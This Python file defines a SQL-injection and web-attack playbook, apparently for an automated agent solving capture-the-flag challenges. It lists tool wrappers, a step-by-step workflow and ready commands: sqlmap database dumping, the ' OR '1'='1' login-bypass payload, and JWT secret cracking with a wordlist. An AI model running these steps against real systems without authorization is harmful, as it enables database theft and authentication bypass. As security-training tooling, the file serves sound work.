"""web_sqli playbook — SQL injection and common web vulns."""

from . import Playbook

PLAYBOOK = Playbook(
    name="web_sqli",
    category="web",
    triggers=("sql", "sqli", "injection", "login bypass", "union select", "database",
              "web", "http", "jwt", "cookie", "admin", "query", "blind"),
    tools=("run_sqlmap", "run_feroxbuster", "run_ffuf", "run_nuclei", "run_jwt_tool"),
    workflow=(
        "1. Map the app: run_feroxbuster / run_ffuf for hidden endpoints; read source/headers.\n"
        "2. Find the injectable parameter (login, search, id). Test ' and boolean/time payloads.\n"
        "3. Automate with run_sqlmap on the parameter/URL (--batch --dbs, then --dump).\n"
        "   For auth bypass try ' OR '1'='1'-- and UNION SELECT to read columns.\n"
        "4. If JWT-based auth, use run_jwt_tool (alg=none, weak secret crack, key confusion).\n"
        "5. run_nuclei to catch known CVEs/misconfigs on the stack.\n"
        "6. Exfiltrate the flag from the DB/admin area; verify format."
    ),
    skeleton=(
        "# Enumerate:  run_feroxbuster('http://host/')\n"
        "# Dump DB:    run_sqlmap('http://host/item?id=1', options='--batch --dbs --dump')\n"
        "# Auth bypass payload:  ' OR '1'='1' -- -\n"
        "# JWT attacks: run_jwt_tool('<token>', options='-C -d /usr/share/wordlists/rockyou.txt')\n"
        "# Known CVEs:  run_nuclei('http://host/')\n"
    ),
)
